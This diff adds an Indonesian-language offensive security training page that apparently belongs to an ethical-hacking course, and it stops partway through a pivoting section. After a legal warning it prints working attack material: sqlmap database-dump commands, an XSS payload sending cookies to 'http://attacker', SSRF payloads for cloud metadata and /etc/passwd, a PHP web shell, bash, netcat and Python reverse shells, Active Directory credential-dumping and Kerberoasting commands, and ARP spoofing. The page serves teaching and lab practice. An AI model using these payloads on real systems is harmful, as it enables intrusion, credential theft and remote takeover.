@@ -1,0 +1,645 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Offensive Security — teknik ethical hacking modern: kill chain, walkthrough SQL injection, serangan web, Active Directory, privilege escalation, wireless & pivoting.">
+  <title>Offensive Security — CyberGuard Academy</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800;900&family=JetBrains+Mono:wght@400;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="css/styles.css">
+</head>
+<body>
+
+  <svg xmlns="http://www.w3.org/2000/svg" style="display:none">
+    <symbol id="ic-shield" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3l7 3v5c0 4.6-2.9 8.2-7 10-4.1-1.8-7-5.4-7-10V6z"/></symbol>
+    <symbol id="ic-shield-check" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3l7 3v5c0 4.6-2.9 8.2-7 10-4.1-1.8-7-5.4-7-10V6z"/><path d="M9 12l2 2 4-4"/></symbol>
+    <symbol id="ic-wrench" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M14.7 6.3a1 1 0 000 1.4l1.6 1.6a1 1 0 001.4 0l3.8-3.8a6 6 0 01-7.9 7.9l-6.9 6.9a2.1 2.1 0 01-3-3l6.9-6.9a6 6 0 017.9-7.9l-3.8 3.8z"/></symbol>
+    <symbol id="ic-arrows" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M8 3L4 7l4 4"/><path d="M4 7h16"/><path d="M16 21l4-4-4-4"/><path d="M20 17H4"/></symbol>
+    <symbol id="ic-target" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><circle cx="12" cy="12" r="5"/><circle cx="12" cy="12" r="1"/></symbol>
+    <symbol id="ic-key" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><circle cx="7.5" cy="15.5" r="5.5"/><path d="M11.8 11.2L22 1m0 0l-4 4m3-6L15.5 4.5 19 8l4-4"/></symbol>
+    <symbol id="ic-terminal" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M4 17l6-5-6-5"/><path d="M12 19h8"/></symbol>
+    <symbol id="ic-server" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="4" width="18" height="7" rx="2"/><rect x="3" y="13" width="18" height="7" rx="2"/><path d="M7 7.5h.01M7 16.5h.01"/></symbol>
+    <symbol id="ic-globe" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M2 12h20"/><path d="M12 2a15.3 15.3 0 010 20 15.3 15.3 0 010-20z"/></symbol>
+    <symbol id="ic-alert" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M10.3 3.9L1.8 18a2 2 0 001.7 3h17a2 2 0 001.7-3L13.7 3.9a2 2 0 00-3.4 0z"/><path d="M12 9v4"/><path d="M12 17h.01"/></symbol>
+    <symbol id="ic-check" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M8 12l3 3 5-6"/></symbol>
+    <symbol id="ic-info" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4"/><path d="M12 8h.01"/></symbol>
+    <symbol id="ic-up" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 19V5"/><path d="M5 12l7-7 7 7"/></symbol>
+    <symbol id="ic-right" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14"/><path d="M12 5l7 7-7 7"/></symbol>
+    <symbol id="ic-down" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M6 9l6 6 6-6"/></symbol>
+    <symbol id="ic-copy" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></symbol>
+    <symbol id="ic-lock" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="11" width="16" height="10" rx="2"/><path d="M8 11V7a4 4 0 118 0v4"/></symbol>
+    <symbol id="ic-menu" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 6h18M3 12h18M3 18h18"/></symbol>
+  </svg>
+
+  <!-- ============ NAVBAR ============ -->
+  <nav class="navbar">
+    <div class="nav-inner">
+      <a href="index.html" class="brand">
+        <span class="brand-mark"><svg><use href="#ic-shield"/></svg></span>
+        <span class="brand-name">CYBER<span class="c">GUARD</span></span>
+      </a>
+      <button class="nav-toggle" aria-label="Menu utama"><svg><use href="#ic-menu"/></svg></button>
+      <div class="nav-right">
+      <ul class="nav-links">
+        <li><a class="nav-link" href="index.html">Beranda</a></li>
+        <li><a class="nav-link" href="fundamentals.html">Fundamental</a></li>
+        <li class="nav-dd">
+          <a class="nav-link" href="offensive.html">Serangan<svg><use href="#ic-down"/></svg></a>
+          <div class="dd-menu">
+            <a href="offensive.html"><svg><use href="#ic-arrows"/></svg>Offensive Security</a>
+            <a href="methodology.html"><svg><use href="#ic-target"/></svg>Metodologi Pentest</a>
+          </div>
+        </li>
+        <li class="nav-dd">
+          <a class="nav-link" href="defensive.html">Pertahanan<svg><use href="#ic-down"/></svg></a>
+          <div class="dd-menu">
+            <a href="defensive.html"><svg><use href="#ic-shield-check"/></svg>Defensive Security</a>
+            <a href="tools.html"><svg><use href="#ic-wrench"/></svg>Katalog Tools</a>
+          </div>
+        </li>
+        <li><a class="nav-link" href="tools.html">Tools</a></li>
+        <li><a class="nav-link" href="careers.html">Karir</a></li>
+      </ul>
+      <button class="term-btn" type="button" data-term-toggle aria-label="Buka terminal"><svg><use href="#ic-terminal"/></svg></button>
+      </div>
+    </div>
+  </nav>
+
+  <section class="page-hero">
+    <div class="container">
+      <div class="ph-kick">modul-03 :: offensive security</div>
+      <h1>Offensive Security — Cara Serang yang Benar</h1>
+      <p>Cara berpikir dan bekerja seperti penyerang, tetapi untuk tujuan yang sah: menguji dan memperkuat. Kuasai alur serangan lengkap — dari identifikasi target sampai laporan — sesuai standar profesional.</p>
+    </div>
+  </section>
+
+  <div class="container">
+    <div class="crumb"><a href="index.html">beranda</a><span class="sep">/</span>offensive-security</div>
+
+    <div class="layout">
+      <aside class="toc" aria-label="Daftar isi halaman">
+        <p class="toc-title">Daftar Isi</p>
+        <a href="#legal"><span>01</span>Etika &amp; Legalitas</a>
+        <a href="#killchain"><span>02</span>Kill Chain</a>
+        <a href="#sqli"><span>03</span>Walkthrough SQLi</a>
+        <a href="#webattacks"><span>04</span>Serangan Web</a>
+        <a href="#shell"><span>05</span>Reverse Shell</a>
+        <a href="#ad"><span>06</span>Active Directory</a>
+        <a href="#privesc"><span>07</span>Privilege Escalation</a>
+        <a href="#network"><span>08</span>Serangan Jaringan</a>
+        <a href="#pivoting"><span>09</span>Pivoting</a>
+        <a href="#cheatsheet"><span>10</span>Cheatsheet</a>
+        <a href="#checklist"><span>11</span>Checklist</a>
+      </aside>
+
+      <div class="layout-main">
+
+        <!-- LEGAL -->
+        <section class="section" id="legal">
+          <div class="alert alert-danger">
+            <svg><use href="#ic-alert"/></svg>
+            <div><strong>Etika &amp; Legalitas adalah Keharusan</strong><p>Seluruh teknik di halaman ini hanya untuk uji keamanan yang sah: lab sendiri, sistem dengan izin tertulis, atau platform CTF resmi. Akses tanpa izin adalah tindak pidana — di Indonesia diatur oleh UU ITE (No. 11/2008 jo. No. 19/2016) dan UU PDP. Tiga kata kunci: <strong>scope</strong>, <strong>izin tertulis</strong>, dan <strong>tanggung jawab</strong>.</p></div>
+          </div>
+        </section>
+
+        <!-- KILL CHAIN -->
+        <section class="section" id="killchain">
+          <div class="sec-head">
+            <span class="sec-num">02 — alur serangan</span>
+            <h2 class="sec-title">Kill Chain: Empat Fase <span class="accent">Inti Penetrasi</span></h2>
+            <p class="sec-sub">Setiap fase punya tujuan, tools, dan output. Berlatih secara berurutan membentuk otot metodologis yang kamu perlukan di engagement nyata.</p>
+          </div>
+          <div class="steps">
+            <div class="step off reveal"><div class="step-num">1</div><div class="step-body"><h4>Reconnaissance</h4><p>Kumpulkan informasi. <strong>Pasif</strong> (tanpa menyentuh target): OSINT, search engine, Shodan, metadata dokumen. <strong>Aktif</strong>: ping sweep, DNS lookup. Tujuan: memperkecil permukaan serangan.</p></div></div>
+            <div class="step off reveal"><div class="step-num">2</div><div class="step-body"><h4>Scanning &amp; Enumeration</h4><p>Petakan port terbuka, service, versi, dan konten. Prinsip emas: <em>enumeration is everything</em>. Semakin lengkap peta, semakin tepat eksploitasi.</p></div></div>
+            <div class="step off reveal"><div class="step-num">3</div><div class="step-body"><h4>Exploitation &amp; Post-Exploitation</h4><p>Tembus sistem lewat celah terverifikasi, lalu menilai nilai akses: privilege escalation, persistence (sesuai izin), dan lateral movement. Setiap aksi harus terukur dan terdokumentasi.</p></div></div>
+            <div class="step def reveal"><div class="step-num">4</div><div class="step-body"><h4>Covering Tracks &amp; Reporting</h4><p>Bersihkan artifact sesuai Rule of Engagement, lalu susun laporan: temuan, bukti, severity, dan rekomendasi. Laporan adalah produk terpenting seorang pentester.</p></div></div>
+          </div>
+          <div class="quote">"Kill chain bukan cuma milik penyerang — di modul <a href="defensive.html">Defensive</a> kamu akan melihat cara memetakan fase-fase ini ke titik deteksi. Penyerang yang baik memahami pertahanan, dan sebaliknya."</div>
+        </section>
+
+        <!-- SQLI WALKTHROUGH -->
+        <section class="section" id="sqli">
+          <div class="sec-head">
+            <span class="sec-num">03 — studi kasus</span>
+            <h2 class="sec-title">Walkthrough Lengkap: <span class="accent">SQL Injection</span></h2>
+            <p class="sec-sub">Simulasi nyata menguji aplikasi web rentan pada lab legal (DVWA / OWASP Juice Shop). Perhatikan setiap langkah punya tujuan yang jelas dan terdokumentasi.</p>
+          </div>
+
+          <h3 style="margin-bottom:6px">Langkah 1 — Reconnaissance &amp; Enumerasi</h3>
+          <div class="terminal">
+            <div class="term-bar"><span class="tdot tdot-r"></span><span class="tdot tdot-y"></span><span class="tdot tdot-g"></span><span class="term-title">step-1 :: recon.py</span><button class="term-copy" type="button"><svg style="width:13px;height:13px"><use href="#ic-copy"/></svg>Salin</button></div>
+            <div class="term-body"><pre><span class="t-cmd">$</span> nmap -sV -p 80,443 10.10.10.10
+<span class="t-dim">80/tcp open  http    Apache httpd 2.4.41 (Ubuntu)</span>
+<span class="t-cmd">$</span> ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
+    -u <span class="t-warn">http://10.10.10.10/FUZZ</span>
+<span class="t-ok">/index.php    [200]</span>
+<span class="t-ok">/config/      [301]</span>
+<span class="t-warn">/search.php   [200]  &lt;- parameter dinamis terindikasi</span></pre></div>
+          </div>
+
+          <h3 style="margin-bottom:6px">Langkah 2 — Deteksi Manual via Burp Repeater</h3>
+          <div class="terminal">
+            <div class="term-bar"><span class="tdot tdot-r"></span><span class="tdot tdot-y"></span><span class="tdot tdot-g"></span><span class="term-title">step-2 :: manual-burp</span><button class="term-copy" type="button"><svg style="width:13px;height:13px"><use href="#ic-copy"/></svg>Salin</button></div>
+            <div class="term-body"><pre><span class="t-comment"># 1) Masukkan karakter kutip — amati error</span>
+GET /search.php?q=<span class="t-warn">'</span> HTTP/1.1        <span class="t-hot">[500] SQL syntax error</span>
+<span class="t-comment"># 2) Inject kondisi selalu benar — amati hasil</span>
+GET /search.php?q=<span class="t-warn">' OR '1'='1</span> HTTP/1.1  <span class="t-ok">[200] semua baris tampil</span>
+<span class="t-comment"># 3) Konfirmasi jumlah kolom (ORDER BY)</span>
+GET /search.php?q=<span class="t-warn">' ORDER BY 4--</span> HTTP/1.1  <span class="t-ok">[200] &rarr; 5 kolom [500]</span></pre></div>
+          </div>
+
+          <h3 style="margin-bottom:6px">Langkah 3 — Otomasi Terukur dengan SQLMap</h3>
+          <div class="terminal">
+            <div class="term-bar"><span class="tdot tdot-r"></span><span class="tdot tdot-y"></span><span class="tdot tdot-g"></span><span class="term-title">step-3 :: sqlmap-automation</span><button class="term-copy" type="button"><svg style="width:13px;height:13px"><use href="#ic-copy"/></svg>Salin</button></div>
+            <div class="term-body"><pre><span class="t-cmd">$</span> sqlmap -u 'http://10.10.10.10/search.php?q=test' --dbs --batch
+<span class="t-ok">[+][+] retrieved: dvwa, information_schema</span>
+<span class="t-cmd">$</span> sqlmap -u 'http://10.10.10.10/search.php?q=test' -D dvwa --tables --batch
+<span class="t-ok">accounts, session, users</span>
+<span class="t-cmd">$</span> sqlmap -u 'http://10.10.10.10/search.php?q=test' -D dvwa -T users --dump --batch
+<span class="t-warn">[!] kredensial ditemukan — cukup buktikan dampak, JANGAN eksfiltrasi di luar scope</span></pre></div>
+          </div>
+
+          <div class="alert alert-info">
+            <svg><use href="#ic-info"/></svg>
+            <div><strong>Best Practice Profesional</strong><p>Di pentest nyata, setelah membuktikan limitasi akses (misal berhasil membaca struktur database), berhenti dan dokumentasikan. Tujuannya membuktikan risiko, bukan mengambil/menghancurkan data. Selalu taati ruang lingkup kontrak.</p></div>
+          </div>
+
+          <h3 style="margin-bottom:6px">Coba Sendiri — Sandbox SQLMap</h3>
+          <p style="color:var(--dim);font-size:0.9rem;margin-bottom:10px">Ketik perintah persis seperti di atas pada terminal interaktif: <code class="inline">sqlmap -u "http://target/search?id=1" --dbs --batch</code>, lalu dump tabel, atau <code class="inline">sqlmap --help</code>.</p>
+          <div class="demo-term" data-profile="sqlmap">
+            <div class="demo-term-head">
+              <span class="tdot tdot-r"></span><span class="tdot tdot-y"></span><span class="tdot tdot-g"></span>
+              <span class="dt-title">sqlmap@10.10.10.10</span>
+              <span class="dt-status">online</span>
+            </div>
+            <div class="demo-term-body">
+              <div class="line t-comment"># Sandbox SQLMap. Coba: --dbs | --tables | --help</div>
+              <div class="dt-input-line"><span class="prompt">$</span><input class="dt-input" type="text" autocomplete="off" spellcheck="false" aria-label="Input terminal SQLMap"></div>
+            </div>
+          </div>
+        </section>
+
+        <!-- WEB ATTACKS -->
+        <section class="section" id="webattacks">
+          <div class="sec-head">
+            <span class="sec-num">04 — serangan web</span>
+            <h2 class="sec-title">Serangan Web Lain yang <span class="accent">Wajib Kamu Kuasai</span></h2>
+            <p class="sec-sub">Setiap kategori punya mekanisme, dampak, dan jalan pulihnya sendiri. Pelajari semuanya lewat tab di bawah.</p>
+          </div>
+          <div class="tabs">
+            <div class="tab-nav">
+              <button class="tab-btn active" data-tab="xss">XSS</button>
+              <button class="tab-btn" data-tab="csrf">CSRF</button>
+              <button class="tab-btn" data-tab="ssrf">SSRF</button>
+              <button class="tab-btn" data-tab="idor">IDOR</button>
+              <button class="tab-btn" data-tab="rce">RCE &amp; Upload</button>
+            </div>
+            <div class="tab-panel active" id="tab-xss">
+              <div class="card">
+                <h3>Cross-Site Scripting (XSS)</h3>
+                <p>Menyisipkan skrip ke halaman yang dilihat korban. Tiga varian: <strong>Reflected</strong> (payload di URL), <strong>Stored</strong> (payload tersimpan di server), dan <strong>DOM-based</strong> (terjadi murni di sisi client).</p>
+                <div class="terminal"><div class="term-bar"><span class="tdot tdot-r"></span><span class="tdot tdot-y"></span><span class="tdot tdot-g"></span><span class="term-title">xss-payload</span><button class="term-copy" type="button"><svg style="width:13px;height:13px"><use href="#ic-copy"/></svg>Salin</button></div><div class="term-body"><pre>&lt;script&gt;fetch('http://attacker/log?c='+document.cookie)&lt;/script&gt;</pre></div></div>
+                <p style="font-size:0.9rem;color:var(--dim);margin-top:8px"><strong>Uji nyata:</strong> intercept value di Burp &rarr; inject payload &rarr; amati callback di server. Di lingkungan modern cek juga CSP bypass karena banyak aplikasi kini memakai Content-Security-Policy.</p>
+              </div>
+            </div>
+            <div class="tab-panel" id="tab-csrf">
+              <div class="card">
+                <h3>Cross-Site Request Forgery (CSRF)</h3>
+                <p>Memanipulasi browser korban yang sudah terautentikasi agar menjalankan aksi tanpa sepengetahuannya — transfer dana, ganti password, atau aksi sensitif lain.</p>
+                <div class="terminal"><div class="term-bar"><span class="tdot tdot-r"></span><span class="tdot tdot-y"></span><span class="tdot tdot-g"></span><span class="term-title">csrf-demo</span><button class="term-copy" type="button"><svg style="width:13px;height:13px"><use href="#ic-copy"/></svg>Salin</button></div><div class="term-body"><pre>&lt;img src="http://bank/transfer?to=xxx&amount=1000"&gt;
+&lt;form action="http://bank/transfer" method="POST"&gt;&lt;/form&gt;</pre></div></div>
+                <p style="font-size:0.9rem;color:var(--dim);margin-top:8px"><strong>Deteksi:</strong> cek kehadiran token anti-CSRF, atribut SameSite pada cookie, dan validasi Origin/Referer.</p>
+              </div>
+            </div>
+            <div class="tab-panel" id="tab-ssrf">
+              <div class="card">
+                <h3>Server-Side Request Forgery (SSRF)</h3>
+                <p>Menipu server agar membuat request ke resource internal — cloud metadata, service internal, ataupun memindai jaringan pribadi. Sering ditemukan di fitur "fetch image" / "import URL".</p>
+                <div class="terminal"><div class="term-bar"><span class="tdot tdot-r"></span><span class="tdot tdot-y"></span><span class="tdot tdot-g"></span><span class="term-title">ssrf-payloads</span><button class="term-copy" type="button"><svg style="width:13px;height:13px"><use href="#ic-copy"/></svg>Salin</button></div><div class="term-body"><pre>url=http://169.254.169.254/latest/meta-data/   <span class="t-comment"># AWS EC2 IMDS</span>
+url=http://localhost:9200/_cat/indices        <span class="t-comment"># Elasticsearch internal</span>
+url=file:///etc/passwd                       <span class="t-comment"># jika protocol tidak dibatasi</span></pre></div></div>
+              </div>
+            </div>
+            <div class="tab-panel" id="tab-idor">
+              <div class="card">
+                <h3>Insecure Direct Object Reference (IDOR)</h3>
+                <p>Mengganti ID objek di parameter/URL untuk mengakses data milik user lain. Serangan paling sederhana tapi paling sering ditemukan di API.</p>
+                <div class="terminal"><div class="term-bar"><span class="tdot tdot-r"></span><span class="tdot tdot-y"></span><span class="tdot tdot-g"></span><span class="term-title">idor-demo</span><button class="term-copy" type="button"><svg style="width:13px;height:13px"><use href="#ic-copy"/></svg>Salin</button></div><div class="term-body"><pre><span class="t-cmd">$</span> GET /api/users/1001/profile   <span class="t-ok">200 OK (profil user lain)</span>
+<span class="t-cmd">$</span> GET /download?file=invoice_001.pdf  <span class="t-ok">200 OK</span></pre></div></div>
+                <p style="font-size:0.9rem;color:var(--dim);margin-top:8px"><strong>Best practice:</strong> gunakan <em>object-level authorization</em> server-side, bukan sekadar menyembunyikan ID di frontend.</p>
+              </div>
+            </div>
+            <div class="tab-panel" id="tab-rce">
+              <div class="card">
+                <h3>RCE via Upload &amp; Deserialization</h3>
+                <p><strong>Malicious file upload:</strong> web shell dengan ekstensi/type yang tidak tervalidasi. <strong>Insecure deserialization:</strong> objek yang dimanipulasi saat aplikasi mendeserialize data (YAML, pickle, Java/PHP object).</p>
+                <div class="terminal"><div class="term-bar"><span class="tdot tdot-r"></span><span class="tdot tdot-y"></span><span class="tdot tdot-g"></span><span class="term-title">webshell-demo</span><button class="term-copy" type="button"><svg style="width:13px;height:13px"><use href="#ic-copy"/></svg>Salin</button></div><div class="term-body"><pre><span class="t-cmd">$</span> echo '&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.php
+<span class="t-cmd">$</span> curl http://target/uploads/shell.php?cmd=id
+<span class="t-ok">uid=33(www-data) gid=33(www-data)</span></pre></div></div>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <!-- REVERSE SHELL -->
+        <section class="section" id="shell">
+          <div class="sec-head">
+            <span class="sec-num">05 — akses</span>
+            <h2 class="sec-title">Reverse Shell: <span class="accent">Konsep yang Wajib Dipahami</span></h2>
+            <p class="sec-sub">Reverse shell adalah fondasi exploitation modern. Target terhubung kembali ke penyerang — mengatasi NAT dan firewall ingress.</p>
+          </div>
+          <div class="grid-2">
+            <div>
+              <div class="card reveal">
+                <h3>Kenapa Reverse, Bukan Bind?</h3>
+                <p>Bind shell berjalan di target dan menunggu koneksi di port tertentu — mudah diblokir firewall egress. Reverse shell membuat <em>target</em> menginisiasi koneksi <em>keluar</em> menuju listener penyerang, yang umumnya diizinkan.</p>
+              </div>
+              <div class="terminal">
+                <div class="term-bar"><span class="tdot tdot-r"></span><span class="tdot tdot-y"></span><span class="tdot tdot-g"></span><span class="term-title">attacker :: listener</span><button class="term-copy" type="button"><svg style="width:13px;height:13px"><use href="#ic-copy"/></svg>Salin</button></div>
+                <div class="term-body"><pre><span class="t-cmd">$</span> nc -lvnp 4444
+<span class="t-ok">listening on [any] 4444 ...</span></pre></div>
+              </div>
+            </div>
+            <div>
+              <div class="terminal">
+                <div class="term-bar"><span class="tdot tdot-r"></span><span class="tdot tdot-y"></span><span class="tdot tdot-g"></span><span class="term-title">target :: payload choices</span><button class="term-copy" type="button"><svg style="width:13px;height:13px"><use href="#ic-copy"/></svg>Salin</button></div>
+                <div class="term-body"><pre><span class="t-comment"># payload yang dikirim (contoh)</span>
+bash -i &gt;&amp; /dev/tcp/10.0.0.2/4444 0&gt;&amp;1
+<span class="t-cmd">$</span> nc -e /bin/sh 10.0.0.2 4444
+<span class="t-cmd">$</span> python3 -c 'import socket,os,pty; s=socket.socket(); s.connect(("10.0.0.2",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); pty.spawn("/bin/bash")'</pre></div>
+              </div>
+              <div class="alert alert-warn">
+                <svg><use href="#ic-alert"/></svg>
+                <div><strong>Kompetensi</strong><p>Kamu pasti akan melihat payload Bash/Python/netcat. Pahami cara kerja masing-masing (stdio, descriptors, pty) sebelum menjalankannya. Dan tetap hanya di lab.</p></div>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <!-- AD -->
+        <section class="section" id="ad">
+          <div class="sec-head">
+            <span class="sec-num">06 — windows</span>
+            <h2 class="sec-title">Hacking Windows &amp; <span class="accent">Active Directory</span></h2>
+            <p class="sec-sub">Target paling umum di dunia korporat. Alur modern berfokus pada Kerberos, SMB, dan dari sana membaca peta relasi AD dengan BloodHound.</p>
+          </div>
+          <div class="terminal">
+            <div class="term-bar"><span class="tdot tdot-r"></span><span class="tdot tdot-y"></span><span class="tdot tdot-g"></span><span class="term-title">ad-attack-path.sh</span><button class="term-copy" type="button"><svg style="width:13px;height:13px"><use href="#ic-copy"/></svg>Salin</button></div>
+            <div class="term-body"><pre><span class="t-cmd">1.</span> nmap -p139,445,3389,389 dc.corp.local
+<span class="t-cmd">2.</span> crackmapexec smb 10.0.0.0/24 --user-file users.txt --pass-file pass.txt
+<span class="t-ok">[+] 10.0.0.15  VALID  admin / Winter2026!</span>
+<span class="t-cmd">3.</span> bloodhound-python -d corp.local -u admin -p 'Winter2026!' -c All
+<span class="t-cmd">4.</span> impacket-secretsdump corp.local/admin:'Winter2026!'@10.0.0.15
+<span class="t-hot">[!] NTDS.dit ter-dump — seluruh hash kredensial domain terekspos</span>
+<span class="t-cmd">5.</span> impacket-GetUserSPNs corp.local/admin:'Winter2026!' -request  <span class="t-comment"># Kerberoast</span>
+<span class="t-cmd">6.</span> hashcat -m 13100 kerberoast.txt rockyou.txt --show    <span class="t-comment"># crack tiket</span></pre></div>
+          </div>
+          <div class="grid-2" style="margin-top:20px">
+            <div class="card reveal">
+              <h3><span class="tag tag-off">Kerberoasting</span></h3>
+              <p>Meminta TGS ticket untuk service yang berjalan sebagai akun user, lalu cracking offline. Steel &mdash; tidak menghasilkan alarm tinggi karena memakai protokol normal.</p>
+            </div>
+            <div class="card reveal">
+              <h3><span class="tag tag-off">Pass-the-Hash</span></h3>
+              <p>Memakai NTLM hash tanpa perlu plaintext untuk autentikasi ke SMB/RDP. Menunjukkan mengapa mencegah cred-harvest lebih penting daripada sekadar password.</p>
+            </div>
+            <div class="card reveal">
+              <h3><span class="tag tag-off">Golden / Silver Ticket</span></h3>
+              <p>Memalsukan Kerberos Ticket Granting Tickets dengan hash KRBTGT. Persistence paling berbahaya di domain — hanya bisa dibersihkan dengan reset password KRBTGT dua kali.</p>
+            </div>
+            <div class="card reveal">
+              <h3><span class="tag tag-off">DCSync</span></h3>
+              <p>Menyamar sebagai Domain Controller untuk mereplikasi kredensial via lsadump::dcsync. Butuh hak tinggi, dampak total.</p>
+            </div>
+          </div>
+        </section>
+
+        <!-- PRIVESC -->
+        <section class="section" id="privesc">
+          <div class="sec-head">
+            <span class="sec-num">07 — naik level</span>
+            <h2 class="sec-title">Privilege Escalation: <span class="accent">Dari User ke Root/Admin</span></h2>
+            <p class="sec-sub">Akses awal hampir selalu user terbatas. Keahlian privesc memisahkan amatir dari profesional. Enumerasi adalah 90% dari permainan.</p>
+          </div>
+          <div class="table-wrap">
+            <table>
+              <thead><tr><th>Teknik</th><th>Platform</th><th>Contoh Perintah</th></tr></thead>
+              <tbody>
+                <tr><td class="mono">SUID misconfig</td><td>Linux</td><td><code class="inline">find / -perm -4000 2&gt;/dev/null</code></td></tr>
+                <tr><td class="mono">Cron jobs insecure</td><td>Linux</td><td><code class="inline">cat /etc/crontab</code> lalu cek script yang writable</td></tr>
+                <tr><td class="mono">Kernel exploit</td><td>Linux</td><td>Match versi kernel vs exploit (Dirty Pipe CVE-2022-0847)</td></tr>
+                <tr><td class="mono">Service binaries</td><td>Windows</td><td>Service path writable &rarr; replace binary ke seImpersonate</td></tr>
+                <tr><td class="mono">Tokens &amp; privileges</td><td>Windows</td><td>JuicyPotato / PrintSpoofer abuse (SeImpersonatePrivilege)</td></tr>
+                <tr><td class="mono">Credential déjà vu</td><td>Dual</td><td>Cari password di config file, history, dan memory dump</td></tr>
+                <tr><td class="mono">Unpatched CVEs</td><td>Dual</td><td>Catat versi &rarr; cek searchsploit/CVE databases</td></tr>
+              </tbody>
+            </table>
+          </div>
+          <div class="alert alert-warn">
+            <svg><use href="#ic-alert"/></svg>
+            <div><strong>Aturan Emas</strong><p>Selalu jalankan <code class="inline">linpeas.sh</code> / <code class="inline">winPEAS</code> terlebih dahulu, dan rujuk GTFOBins (Linux) / LOLBAS (Windows / PrivescCheck). Jangan asal melepas exploit kernel — pahami versi, keterandalan, dan kemungkinan crash-nya.</p></div>
+          </div>
+          <h3 style="margin-top:6px">Referensi Cepat</h3>
+          <div class="pill-row">
+            <span class="tag tag-rec">GTFOBins</span><span class="tag tag-rec">LOLBAS</span><span class="tag tag-rec">HackTricks</span><span class="tag tag-rec">PayloadsAllTheThings</span><span class="tag tag-rec">MITRE ATT&amp;CK</span>
+          </div>
+        </section>
+
+        <!-- NETWORK -->
+        <section class="section" id="network">
+          <div class="sec-head">
+            <span class="sec-num">08 — jaringan</span>
+            <h2 class="sec-title">MITM &amp; Serangan <span class="accent">Jaringan Lokal</span></h2>
+            <p class="sec-sub">Sebatasi pada lab. Memahami teknik ini justru membuatmu lebih pandai membelanya.</p>
+          </div>
+          <div class="grid-2">
+            <div>
+              <div class="terminal">
+                <div class="term-bar"><span class="tdot tdot-r"></span><span class="tdot tdot-y"></span><span class="tdot tdot-g"></span><span class="term-title">bettercap :: ARP spoof</span><button class="term-copy" type="button"><svg style="width:13px;height:13px"><use href="#ic-copy"/></svg>Salin</button></div>
+                <div class="term-body"><pre>sudo bettercap -iface wlan0
+[bettercap] net.probe on
+[bettercap] set arp.spoof.targets 10.0.0.5
+[bettercap] arp.spoof on
+[bettercap] net.sniff on</pre></div>
+              </div>
+            </div>
+            <div>
+              <div class="card reveal">
+                <h3>Apa yang Terjadi?</h3>
+                <p>Di sebuah segmen jaringan, penyerang memposisikan diri seolah-olah sebagai gateway. Traffic korban mengalir melalui penyerang — kredensial HTTP plaintext dapat tertangkap. Ini yang membuat HTTPS + HSTS dan 802.1X port security menjadi krusial.</p>
+              </div>
+              <div class="card reveal" style="margin-top:14px">
+                <h3>Deteksi yang Harus Kamu Tahu</h3>
+                <p>MAC ganda di tabel ARP, latensi naik, sertifikat tidak valid saat membuka HTTPS, dan lonjakan ICMP. Mengenal tanda-tanda ini membuatmu bisa membela dengan lebih tajam.</p>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <!-- PIVOTING -->
+        <section class="section" id="pivoting">
+          <div class="sec-head">
+            <span class="sec-num">09 — bergerak</span>
+            <h2 class="sec-title">Pivoting &amp; Lateral <span class="accent">Movement</span></h2>
+            <p class="sec-sub">Setelah menguasai satu host, lanjut ke internal. Pivoting = menggunakan host yang didapat sebagai jembatan ke segmen lain.</p>
+          </div>
+          <div class="grid-2">
+            <div class="terminal">
